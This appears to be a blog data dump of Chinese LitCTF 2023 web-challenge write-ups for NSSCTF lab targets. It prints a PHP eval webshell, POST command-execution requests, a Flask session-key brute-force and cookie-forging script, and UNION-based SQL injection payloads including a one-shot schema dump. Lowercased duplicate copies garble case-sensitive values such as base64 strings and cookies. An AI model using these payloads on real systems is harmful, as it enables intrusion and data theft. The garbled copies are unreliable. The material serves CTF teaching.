题目18：vim yyds\n\n\n# 题目描述：漏…漏了！\n\n\n# 考点1：信息泄露\n\n\n# 考点2：linux常用命令\n\n\n# 预期解：\n\n进入页面后，发现只有一个vim的图标，结合题目描述，可以大致想到是vim缓存文件泄露\n\n> vim的备份文件后缀/vim缓存文件后缀\n> \n> 使用 vim 时会创建临时缓存文件，关闭vim时缓存文件会被删除。如果vim 异常 退出，这时候未处理缓存文件，就会导致可以通过缓存文件查看文件内容。 第一次意外退出产生的备份文件名为：.filename.swp 第二次意外退出产生的备份文件名为：.filename.swo 第三次意外退出产生的备份文件名为：.filename.swn\n\n由此我们可以访问.index.php.swp，这个文件就是vim编辑后的缓存文件，在下载过后（有可能杀毒软件会弹窗），我们用010editor或者其他编辑器打开，找到关键代码\n\n$password = \"give_me_your_flag\";\n$_post['password'] === base64_encode($password)\neval(system($_post['cmd']));\n\n\n1\n2\n3\n\n\n这段代码的意思是，我们用post方法请求，并且传入一个名为“password”的参数，参数值必须为用base64加密过后的\"give_me_your_flag\"，这样才能触发后边的木马，也就是传入一个名为cmd的参数，这个参数值即为命令。\n\n我们打开hackbar，像该网站发送请求\n\n#地址\nhttp://node4.anna.nssctf.cn:28004/\n#参数\npassword=r2l2zv9nzv9zb3vyx0zsywc=&cmd=cat /flag\n\n\n1\n2\n3\n4\n\n\n",charsets:{cjk:!0},lastUpdated:"2024/11/28, 20:38:58",lastUpdatedTimestamp:1732797538e3},{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3867",frontmatter:{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3867",date:"2024-11-25T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-25-1-CTF-3867-WriteUp.html",relativePath:"views/essay/2024-11-25-1-CTF-3867-WriteUp.md",key:"v-3cbe4254",path:"/views/essay/2024-11-25-1-CTF-3867-WriteUp.html",headers:[{level:3,title:"题目描述：交作业！！但是哪里不对？",slug:"题目描述-交作业-但是哪里不对",normalizedTitle:"题目描述：交作业！！但是哪里不对？",charIndex:42},{level:3,title:"考点1：文件上传",slug:"考点1-文件上传",normalizedTitle:"考点1：文件上传",charIndex:63},{level:3,title:"解法1：文件上传",slug:"解法1-文件上传",normalizedTitle:"解法1：文件上传",charIndex:75},{level:3,title:"解法2：远程下载",slug:"解法2-远程下载",normalizedTitle:"解法2：远程下载",charIndex:87},{level:3,title:"解法3：直接编辑读取",slug:"解法3-直接编辑读取",normalizedTitle:"解法3：直接编辑读取",charIndex:99},{level:3,title:"彩蛋：",slug:"彩蛋",normalizedTitle:"彩蛋：",charIndex:113},{level:3,title:"注：",slug:"注",normalizedTitle:"注：",charIndex:120}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第17题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP【<a href="https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP视频【<a href="https://www.bilibili.com/video/BV1sm4y187EK" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3867</td>\n<td>作业管理系统</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：交作业！！但是哪里不对？ 考点1：文件上传 解法1：文件上传 解法2：远程下载 解法3：直接编辑读取 彩蛋： 注：",content:'[LitCTF 2023]这套题是Web方向入门题单，这是我的第17题\n\n\n\n * 题目描述：交作业！！但是哪里不对？\n * 考点1：文件上传\n * 解法1：文件上传\n * 解法2：远程下载\n * 解法3：直接编辑读取\n * 彩蛋：\n * 注：\n\n\n\n * 题单【传送门】\n * 主办方WriteUP【传送门】\n * 主办方WriteUP视频【传送门】\n\n题目编号   题目名称     题目方向   难度\n3867   作业管理系统   Web    1\n\n\n# 题目17： 作业管理系统\n\n\n# 题目描述：交作业！！但是哪里不对？\n\n\n# 考点1：文件上传\n\n首先，我们在做Web题的时候，要记得先审查元素看一下源代码，说不定会有惊喜呢？这里提示我们用户名和密码都是admin\n\n\n\n\n# 解法1：文件上传\n\n进入页面后可以看到很显眼的“文件上传”选项，我们直接点击上传文件\n\n\n\n我们编写一个简单的php木马上传到服务器中。\n\n<?php @eval($_POST[1]); ?>\n\n\n1\n\n\n\n\n我们点击上传以后，返回主页，看到目录上方的统计数量变成了“1 个文件夹 2 个文件”，我们知道是我们上传成功了。我们已经可以在浏览器去访问1.php的文件了。\n\nhttp://node4.anna.nssctf.cn:28599/1.php\n\n\n1\n\n\n我们进入页面后，打开F12开发者工具，选择HackBar工具，发送一个POST请求，内容为\n\n# 1是我们在木马里起的名字\n1=system("ls /");\n\n\n1\n2\n\n\n\n\n通过上边的方式，我们可以直接在运行system语句来执行服务器命令，这样，我们就可以直接用cat来展示flag了\n\n1=system("cat /flag");\n\n\n1\n\n\n\n\n\n# 解法2：远程下载\n\n我们在打开页面后，除了有上传文件，还有一个下载文件的地方。此题目如果上传有限制的话，就可以使用这个下载的功能，用远程下载去下载木马，然后编辑保存即可。\n\n\n\n**重点：**基于file协议，将根目录文件直接下载到当前目录\n\n**注：**页面访问的是当前目录，也就是 ./ 这个目录，而flag是在 / 根目录下\n\n\n\n点击下载后，我们选择编辑文件，即可查看该flag。\n\n\n\n也可以在链接后直接加个flag，通过地址栏的方式直接下载flag的文件。\n\nhttp://node4.anna.nssctf.cn:28599/flag\n\n\n1\n\n\n下载到本地后打开即可看到flag\n\n\n# 解法3：直接编辑读取\n\n如果没有使用 file:/// 这个协议，我们可以在下载文件并编辑的时候，直接修改地址栏的内容\n\nhttp://node4.anna.nssctf.cn:28599/index.php?op=edit&fename=flag&folder=/\n\n\n1\n\n\n通过这段地址，我们就可以直接编辑根目录下的flag文件，也就可以直观的展示到页面中了。\n\n\n# 彩蛋：\n\n在远程下载中，提供了一个预输入，访问该地址，即可得到彩蛋。\n\n\n\n该地址是一个github地址，我们访问这个地址\n\n\n\n\n# 注：\n\n在做这道题的时候，没注意到时间限制，结果到时间了，大家一定要注意时间呀',normalizedContent:'[litctf 2023]这套题是web方向入门题单，这是我的第17题\n\n\n\n * 题目描述：交作业！！但是哪里不对？\n * 考点1：文件上传\n * 解法1：文件上传\n * 解法2：远程下载\n * 解法3：直接编辑读取\n * 彩蛋：\n * 注：\n\n\n\n * 题单【传送门】\n * 主办方writeup【传送门】\n * 主办方writeup视频【传送门】\n\n题目编号   题目名称     题目方向   难度\n3867   作业管理系统   web    1\n\n\n# 题目17： 作业管理系统\n\n\n# 题目描述：交作业！！但是哪里不对？\n\n\n# 考点1：文件上传\n\n首先，我们在做web题的时候，要记得先审查元素看一下源代码，说不定会有惊喜呢？这里提示我们用户名和密码都是admin\n\n\n\n\n# 解法1：文件上传\n\n进入页面后可以看到很显眼的“文件上传”选项，我们直接点击上传文件\n\n\n\n我们编写一个简单的php木马上传到服务器中。\n\n<?php @eval($_post[1]); ?>\n\n\n1\n\n\n\n\n我们点击上传以后，返回主页，看到目录上方的统计数量变成了“1 个文件夹 2 个文件”，我们知道是我们上传成功了。我们已经可以在浏览器去访问1.php的文件了。\n\nhttp://node4.anna.nssctf.cn:28599/1.php\n\n\n1\n\n\n我们进入页面后，打开f12开发者工具，选择hackbar工具，发送一个post请求，内容为\n\n# 1是我们在木马里起的名字\n1=system("ls /");\n\n\n1\n2\n\n\n\n\n通过上边的方式，我们可以直接在运行system语句来执行服务器命令，这样，我们就可以直接用cat来展示flag了\n\n1=system("cat /flag");\n\n\n1\n\n\n\n\n\n# 解法2：远程下载\n\n我们在打开页面后，除了有上传文件，还有一个下载文件的地方。此题目如果上传有限制的话，就可以使用这个下载的功能，用远程下载去下载木马，然后编辑保存即可。\n\n\n\n**重点：**基于file协议，将根目录文件直接下载到当前目录\n\n**注：**页面访问的是当前目录，也就是 ./ 这个目录，而flag是在 / 根目录下\n\n\n\n点击下载后，我们选择编辑文件，即可查看该flag。\n\n\n\n也可以在链接后直接加个flag，通过地址栏的方式直接下载flag的文件。\n\nhttp://node4.anna.nssctf.cn:28599/flag\n\n\n1\n\n\n下载到本地后打开即可看到flag\n\n\n# 解法3：直接编辑读取\n\n如果没有使用 file:/// 这个协议，我们可以在下载文件并编辑的时候，直接修改地址栏的内容\n\nhttp://node4.anna.nssctf.cn:28599/index.php?op=edit&fename=flag&folder=/\n\n\n1\n\n\n通过这段地址，我们就可以直接编辑根目录下的flag文件，也就可以直观的展示到页面中了。\n\n\n# 彩蛋：\n\n在远程下载中，提供了一个预输入，访问该地址，即可得到彩蛋。\n\n\n\n该地址是一个github地址，我们访问这个地址\n\n\n\n\n# 注：\n\n在做这道题的时候，没注意到时间限制，结果到时间了，大家一定要注意时间呀',charsets:{cjk:!0},lastUpdated:"2024/11/26, 20:10:53",lastUpdatedTimestamp:1732623053e3},{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3872",frontmatter:{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3872",date:"2024-11-29T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-29-1-CTF-3872-WtriteUp.html",relativePath:"views/essay/2024-11-29-1-CTF-3872-WtriteUp.md",key:"v-296260b4",path:"/views/essay/2024-11-29-1-CTF-3872-WtriteUp.html",headers:[{level:3,title:"题目描述：大型Flag赠送活动开始啦，不过只有管理员才能拿到",slug:"题目描述-大型flag赠送活动开始啦-不过只有管理员才能拿到",normalizedTitle:"题目描述：大型flag赠送活动开始啦，不过只有管理员才能拿到",charIndex:42},{level:3,title:"考点：Flask  session伪造",slug:"考点-flask-session伪造",normalizedTitle:"考点：flask  session伪造",charIndex:null},{level:3,title:"预期解：",slug:"预期解",normalizedTitle:"预期解：",charIndex:98}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第21题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP【<a href="https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP视频【<a href="https://www.bilibili.com/video/BV1sm4y187EK" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3872</td>\n<td>Flag点击就送！</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：大型Flag赠送活动开始啦，不过只有管理员才能拿到 考点：Flask  session伪造 预期解：",content:"[LitCTF 2023]这套题是Web方向入门题单，这是我的第21题\n\n\n\n * 题目描述：大型Flag赠送活动开始啦，不过只有管理员才能拿到\n * 考点：Flask session伪造\n * 预期解：\n\n\n\n * 题单【传送门】\n * 主办方WriteUP【传送门】\n * 主办方WriteUP视频【传送门】\n\n题目编号   题目名称        题目方向   难度\n3872   Flag点击就送！   Web    1\n\n\n# 题目21：Flag点击就送！\n\n\n# 题目描述：大型Flag赠送活动开始啦，不过只有管理员才能拿到\n\n\n# 考点：Flask session伪造\n\n\n# 预期解：\n\n我们进入靶机后，看到了提示“欢迎参加LitCTF，告诉我你的名字吧”，我们随便输入一个名字，弹出一个按钮“拿flag”，点击以后提示“只有管理员才能拿flag耶”。\n\n此时我们返回初始页面，尝试输入admin或者root，发现都不可以，所以我们准备使用工具进行爆破，这里用到的工具是Python，安装了flask-unsign[wordlist]的库，推荐使用清华源进行安装。具体安装过程不多做介绍。\n\n默认是我们有了一个字典文件，字典内容为\n\nLitCTF2023\nLitCTF\n123456\n\n\n1\n2\n3\n\n\n我们使用如下命令来执行爆破命令\n\nflask-unsign --unsign --cookie \"eyJuYW1lIjoiMTIzIn0.Z0mhXQ.CjDOrMBNmg28PtyaZGGdtE1MSlA\" -w 字典路径 --no-literal-eval\n\n\n1\n\n\n这里的cookie是打开F12后，在Application里面，找到Cookies，看到了一个session的cookie，复制它的值\n\n\n\n在执行命令后，我们得到了如下结果，可以看到应该是LitCTF才是我们想要的用户名。\n\n(comvision) C:\\Users\\19854>flask-unsign --unsign --cookie \"eyJuYW1lIjoiMTIzIn0.Z0mhXQ.CjDOrMBNmg28PtyaZGGdtE1MSlA\" -w C:\\Users\\19854\\Desktop\\pass.txt --no-literal-eval\n[*] Session decodes to: {'name': '123'}\n[*] Starting brute-forcer with 8 threads..\n[+] Found secret key after 3 attempts\nb'LitCTF'\n\n\n1\n2\n3\n4\n5\n\n\n确认LitCTF就是用户名以后，我们用一把梭工具进行伪造\n\nimport requests\nimport string\nimport subprocess\n\nSECRET_KEY = \"LitCTF\"\n\ncmd_out = subprocess.check_output(['flask-unsign', '--sign', '--cookie', '{\\'name\\': \\'admin\\'}', '--secret', SECRET_KEY])\n\ncookie = {'session' : cmd_out.decode().rstrip()}\nresponse = requests.get('http://node4.anna.nssctf.cn:28088/flag', cookies=cookie)\n\nprint(response.text)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n伪造的方式多种多样，比如使用flask-session-cookie-manager\n\n具体使用方法如下\n\npython3 flask-session-cookie-manager3.py decode -c \"session值\" (-s \"key值\")\npython3 flask-session-cookie-manager3.py encode -s \"key值\" -t \"我们需要伪造的值\"\n\n\n1\n2\n\n\npython3 flask-session-cookie-manager3.py encode -s 'LitCTF' -t '{\"name\":\"admin\"}'\n# eyJuYW1lIjoiYWRtaW4ifQ.ZOBwTg.fCkX986VBbFDKMaipQ5QjHJAkQg\n\n\n1\n2\n\n\n此时再访问/flag，将当前页面cookie改为伪造的值，刷新页面即可看到flag",normalizedContent:"[litctf 2023]这套题是web方向入门题单，这是我的第21题\n\n\n\n * 题目描述：大型flag赠送活动开始啦，不过只有管理员才能拿到\n * 考点：flask session伪造\n * 预期解：\n\n\n\n * 题单【传送门】\n * 主办方writeup【传送门】\n * 主办方writeup视频【传送门】\n\n题目编号   题目名称        题目方向   难度\n3872   flag点击就送！   web    1\n\n\n# 题目21：flag点击就送！\n\n\n# 题目描述：大型flag赠送活动开始啦，不过只有管理员才能拿到\n\n\n# 考点：flask session伪造\n\n\n# 预期解：\n\n我们进入靶机后，看到了提示“欢迎参加litctf，告诉我你的名字吧”，我们随便输入一个名字，弹出一个按钮“拿flag”，点击以后提示“只有管理员才能拿flag耶”。\n\n此时我们返回初始页面，尝试输入admin或者root，发现都不可以，所以我们准备使用工具进行爆破，这里用到的工具是python，安装了flask-unsign[wordlist]的库，推荐使用清华源进行安装。具体安装过程不多做介绍。\n\n默认是我们有了一个字典文件，字典内容为\n\nlitctf2023\nlitctf\n123456\n\n\n1\n2\n3\n\n\n我们使用如下命令来执行爆破命令\n\nflask-unsign --unsign --cookie \"eyjuyw1lijoimtizin0.z0mhxq.cjdormbnmg28ptyazggdte1msla\" -w 字典路径 --no-literal-eval\n\n\n1\n\n\n这里的cookie是打开f12后，在application里面，找到cookies，看到了一个session的cookie，复制它的值\n\n\n\n在执行命令后，我们得到了如下结果，可以看到应该是litctf才是我们想要的用户名。\n\n(comvision) c:\\users\\19854>flask-unsign --unsign --cookie \"eyjuyw1lijoimtizin0.z0mhxq.cjdormbnmg28ptyazggdte1msla\" -w c:\\users\\19854\\desktop\\pass.txt --no-literal-eval\n[*] session decodes to: {'name': '123'}\n[*] starting brute-forcer with 8 threads..\n[+] found secret key after 3 attempts\nb'litctf'\n\n\n1\n2\n3\n4\n5\n\n\n确认litctf就是用户名以后，我们用一把梭工具进行伪造\n\nimport requests\nimport string\nimport subprocess\n\nsecret_key = \"litctf\"\n\ncmd_out = subprocess.check_output(['flask-unsign', '--sign', '--cookie', '{\\'name\\': \\'admin\\'}', '--secret', secret_key])\n\ncookie = {'session' : cmd_out.decode().rstrip()}\nresponse = requests.get('http://node4.anna.nssctf.cn:28088/flag', cookies=cookie)\n\nprint(response.text)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n伪造的方式多种多样，比如使用flask-session-cookie-manager\n\n具体使用方法如下\n\npython3 flask-session-cookie-manager3.py decode -c \"session值\" (-s \"key值\")\npython3 flask-session-cookie-manager3.py encode -s \"key值\" -t \"我们需要伪造的值\"\n\n\n1\n2\n\n\npython3 flask-session-cookie-manager3.py encode -s 'litctf' -t '{\"name\":\"admin\"}'\n# eyjuyw1lijoiywrtaw4ifq.zobwtg.fckx986vbbfdkmaipq5qjhjakqg\n\n\n1\n2\n\n\n此时再访问/flag，将当前页面cookie改为伪造的值，刷新页面即可看到flag",charsets:{cjk:!0},lastUpdated:"2024/11/30, 21:40:57",lastUpdatedTimestamp:1732974057e3},{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3868",frontmatter:{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3868",date:"2024-11-27T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-27-1-CTF-3868-WriteUp.html",relativePath:"views/essay/2024-11-27-1-CTF-3868-WriteUp.md",key:"v-ad199818",path:"/views/essay/2024-11-27-1-CTF-3868-WriteUp.html",headers:[{level:3,title:"题目描述：为了安全起见多带了几个套罢了o(////▽////)q",slug:"题目描述-为了安全起见多带了几个套罢了o-▽-q",normalizedTitle:"题目描述：为了安全起见多带了几个套罢了o(////▽////)q",charIndex:42},{level:3,title:"考点1：SQL注入",slug:"考点1-sql注入",normalizedTitle:"考点1：sql注入",charIndex:78},{level:3,title:"考点2：白盒",slug:"考点2-白盒",normalizedTitle:"考点2：白盒",charIndex:91},{level:3,title:"方法1：手工注入，逐个注入",slug:"方法1-手工注入-逐个注入",normalizedTitle:"方法1：手工注入，逐个注入",charIndex:101},{level:3,title:"方法2：手工注入 DIOS（Dump in one shot）",slug:"方法2-手工注入-dios-dump-in-one-shot",normalizedTitle:"方法2：手工注入 dios（dump in one shot）",charIndex:118},{level:3,title:"彩蛋：输入2，然后执行",slug:"彩蛋-输入2-然后执行",normalizedTitle:"彩蛋：输入2，然后执行",charIndex:153},{level:3,title:"总结：需要学好SQL基础，尤其是union操作符的用法",slug:"总结-需要学好sql基础-尤其是union操作符的用法",normalizedTitle:"总结：需要学好sql基础，尤其是union操作符的用法",charIndex:168}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第19题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP【<a href="https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP视频【<a href="https://www.bilibili.com/video/BV1sm4y187EK" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3868</td>\n<td>这是什么？SQL ！注一下 ！</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：为了安全起见多带了几个套罢了o(////▽////)q 考点1：SQL注入 考点2：白盒 方法1：手工注入，逐个注入 方法2：手工注入 DIOS（Dump in one shot） 彩蛋：输入2，然后执行 总结：需要学好SQL基础，尤其是union操作符的用法",content:"[LitCTF 2023]这套题是Web方向入门题单，这是我的第19题\n\n\n\n * 题目描述：为了安全起见多带了几个套罢了o(////▽////)q\n * 考点1：SQL注入\n * 考点2：白盒\n * 方法1：手工注入，逐个注入\n * 方法2：手工注入 DIOS（Dump in one shot）\n * 彩蛋：输入2，然后执行\n * 总结：需要学好SQL基础，尤其是union操作符的用法\n\n\n\n * 题单【传送门】\n * 主办方WriteUP【传送门】\n * 主办方WriteUP视频【传送门】\n\n题目编号   题目名称              题目方向   难度\n3868   这是什么？SQL ！注一下 ！   Web    1\n\n\n# 题目19：这是什么？SQL ！注一下 ！\n\n\n# 题目描述：为了安全起见多带了几个套罢了o(////▽////)q\n\n\n# 考点1：SQL注入\n\n\n# 考点2：白盒\n\n\n# 方法1：手工注入，逐个注入\n\n进入靶场，我们可以看到页面中的提示，左下角可以看到白盒页面，是用php写的SQL查询，查询语句多了几层括号\n\n\n\n我们的思路是先闭合括号，然后用注释符号注释掉后边的括号，我们就能在中间执行对应的SQL语句，语句最后是如下形式的\n\nSELECT username,password FROM users WHERE id = ((((((1)))))) ANY --+))))))\n\n\n1\n\n\n我们使用HackBar进行辅助SQL注入，我们打开F12控制台，切换到HackBar，题目给出了提示的列名是username和password两个，我们可以使用HackBar自带的预处理语句进行注入：\n\n\n\n这里我们选择第一个，Dump all database name，也就是爆破所有库名\n\n\n\n我们有username和password两列，所以the number of columns需要填2\n\n然后Output positions填1的情况返回值如下\n\nExecuted Operations:\nSELECT username,password FROM users WHERE id = ((((((11)))))) union select group_concat(schema_name),2 from information_schema.schemata -- ))))))))))))\n\nArray ( [0] => Array ( [username] => information_schema,mysql,ctftraining,performance_schema,test,ctf [password] => 2 ) )\n\n\n1\n2\n3\n4\n\n\n然后Output positions填2的情况返回值如下\n\nExecuted Operations:\nSELECT username,password FROM users WHERE id = ((((((11)))))) union select 1,group_concat(schema_name) from information_schema.schemata -- ))))))))))))\n\nArray ( [0] => Array ( [username] => 1 [password] => information_schema,mysql,ctftraining,performance_schema,test,ctf ) )\n\n\n1\n2\n3\n4\n\n\n我们怀疑是在ctftraining、test、ctf这三个库最有可能存放flag，所以我们去爆这三个库的表名\n\n\n\n把union的部分都删掉，换成爆破表名的部分，选择Dump tables from database\n\n\n\n-- 默认是database()\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+))))))\n-- 我们手动选择库名\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctftraining' --+))))))\n\n\n1\n2\n3\n4\n\n\n执行之后，我们得到如下结果\n\nExecuted Operations:\nSELECT username,password FROM users WHERE id = ((((((11)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctftraining' -- ))))))))))))\n\nArray ( [0] => Array ( [username] => 1 [password] => flag,news,users ) )\n\n\n1\n2\n3\n4\n\n\n下一步我们爆表里面的字段名：\n\n我们在HackBar的SQLI选项里选择MySQL，然后选择Dump columns from database，然后将库名替换为ctftraining\n\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema='ctftraining' --+))))))\n\n\n1\n\n\n执行之后，我们得到如下结果\n\nExecuted Operations:\nSELECT username,password FROM users WHERE id = ((((((11)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema='ctftraining' -- ))))))))))))\n\nArray ( [0] => Array ( [username] => 1 [password] => flag,id,title,content,time,id,username,password,ip,time ) )\n\n\n1\n2\n3\n4\n\n\n最后我们使用联合查询的方式，直接将flag这个字段的值拿出来\n\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,flag from ctftraining.flag --+))))))\n\n\n1\n\n\n这句话的意思是，我们查询ctftraining库下的flag表的flag字段\n\nExecuted Operations:\nSELECT username,password FROM users WHERE id = ((((((11)))))) union select 1,flag from ctftraining.flag -- ))))))))))))\n\nArray ( [0] => Array ( [username] => 1 [password] => NSSCTF{6090c84c-7585-4fb7-989d-598b04e7ba82} ) )\n\n\n1\n2\n3\n4\n\n\n\n# 方法2：手工注入 DIOS（Dump in one shot）\n\n我们除了第一种的方法，先爆破库名，然后爆破表名，然后爆破列名，最后用列名做查询。我们还可以使用一波流，直接将整个库都拿下来，具体方法如下\n\n\n\n选择Dump in one shot，会生成HackBar的预处理语句（需要注意生成的这句话是一个列名，需要和1对齐），我们直接点运行\n\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,\n\n(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a) \n\n--+))))))\n\n\n1\n2\n3\n4\n5\n\n\n此时得到的回显会很长，我们需要筛查其中的内容，找到flag这个表和flag的flag字段\n\nExecuted Operations:\nSELECT username,password FROM users WHERE id = ((((((11)))))) union select 1,(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a) -- ))))))))))))\n\n\n---内容仅展示部分\nArray ( [0] => Array ( [username] => 1 [password] => [ information_schema ] > ALL_PLUGINS > PLUGIN_NAME| [ information_schema ] > ALL_PLUGINS > PLUGIN_VERSION| [ information_schema ] > ALL_PLUGINS > PLUGIN_STATUS| [ information_schema ] > ALL_PLUGINS > PLUGIN_TYPE| [ information_schema ] > ALL_PLUGINS > PLUGIN_TYPE_VERSION| [ information_schema ] > ALL_PLUGINS > PLUGIN_LIBRARY| [ information_schema ] > ALL_PLUGINS > PLUGIN_LIBRARY_VERSION| [ information_schema ] > ALL_PLUGINS > PLUGIN_AUTHOR| [ information_schema ] > ALL_PLUGINS > PLUGIN_DESCRIPTION| [ information_schema ] > ALL_PLUGINS > PLUGIN_LICENSE| [ information_schema ] > ALL_PLUGINS > LOAD_OPTION| [ information_schema ] > ALL_PLUGINS > PLUGIN_MATURITY| [ information_schema ] > ALL_PLUGINS > PLUGIN_AUTH_VERSION| [ information_schema ] > APPLICABLE_ROLES > GRANTEE| [ information_schema ] > APPLICABLE_ROLES > ROLE_NAME| [ information_schema ] > APPLICABLE_ROLES > IS_GRANTABLE| [ information_schema ] > APPLICABLE_ROLES > IS_DEFAULT| [ information_schema ] > CHARACTER_SETS > CHARACTER_SET_NAME| [ information_schema ] > CHARACTER_SETS > DEFAULT_COLLATE_NAME| [ information_schema ] > CHARACTER_SETS > DESCRIPTION| [ information_schema ] > CHARACTER_SETS > MAXLEN| [ information_schema ] > CHECK_CONSTRAINTS > CONSTRAINT_CATALOG| [ information_schema ] > CHECK_CONSTRAINTS > CONSTRAINT_SCHEMA| [ information_schema ] > CHECK_CONSTRAINTS > TABLE_NAME| [ information_schema ] > CHECK_CONSTRAINTS > CONSTRAINT_NAME| [ information_schema ] > CHECK_CONSTRAINTS > CHECK_CLAUSE| [ information_schema ] > COLLATIONS > COLLATION_NAME| [ information_schema ] > COLLATIONS > CHARACTER_SET_NAME| [ information_schema ] > COLLATIONS > ID| [ \n\n\n1\n2\n3\n4\n5\n6\n\n\n最后我们使用联合查询的方式，直接将flag这个字段的值拿出来\n\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,flag from ctftraining.flag --+))))))\n\n\n1\n\n\n\n# 彩蛋：输入2，然后执行\n\nExecuted Operations:\nSELECT username,password FROM users WHERE id = ((((((2))))))\n\nArray ( [0] => Array ( [username] => fake_flag [password] => F1rst_to_Th3_eggggggggg!} (4/4) ) )\n\n\n1\n2\n3\n4\n\n\n\n# 总结：需要学好SQL基础，尤其是union操作符的用法",normalizedContent:"[litctf 2023]这套题是web方向入门题单，这是我的第19题\n\n\n\n * 题目描述：为了安全起见多带了几个套罢了o(////▽////)q\n * 考点1：sql注入\n * 考点2：白盒\n * 方法1：手工注入，逐个注入\n * 方法2：手工注入 dios（dump in one shot）\n * 彩蛋：输入2，然后执行\n * 总结：需要学好sql基础，尤其是union操作符的用法\n\n\n\n * 题单【传送门】\n * 主办方writeup【传送门】\n * 主办方writeup视频【传送门】\n\n题目编号   题目名称              题目方向   难度\n3868   这是什么？sql ！注一下 ！   web    1\n\n\n# 题目19：这是什么？sql ！注一下 ！\n\n\n# 题目描述：为了安全起见多带了几个套罢了o(////▽////)q\n\n\n# 考点1：sql注入\n\n\n# 考点2：白盒\n\n\n# 方法1：手工注入，逐个注入\n\n进入靶场，我们可以看到页面中的提示，左下角可以看到白盒页面，是用php写的sql查询，查询语句多了几层括号\n\n\n\n我们的思路是先闭合括号，然后用注释符号注释掉后边的括号，我们就能在中间执行对应的sql语句，语句最后是如下形式的\n\nselect username,password from users where id = ((((((1)))))) any --+))))))\n\n\n1\n\n\n我们使用hackbar进行辅助sql注入，我们打开f12控制台，切换到hackbar，题目给出了提示的列名是username和password两个，我们可以使用hackbar自带的预处理语句进行注入：\n\n\n\n这里我们选择第一个，dump all database name，也就是爆破所有库名\n\n\n\n我们有username和password两列，所以the number of columns需要填2\n\n然后output positions填1的情况返回值如下\n\nexecuted operations:\nselect username,password from users where id = ((((((11)))))) union select group_concat(schema_name),2 from information_schema.schemata -- ))))))))))))\n\narray ( [0] => array ( [username] => information_schema,mysql,ctftraining,performance_schema,test,ctf [password] => 2 ) 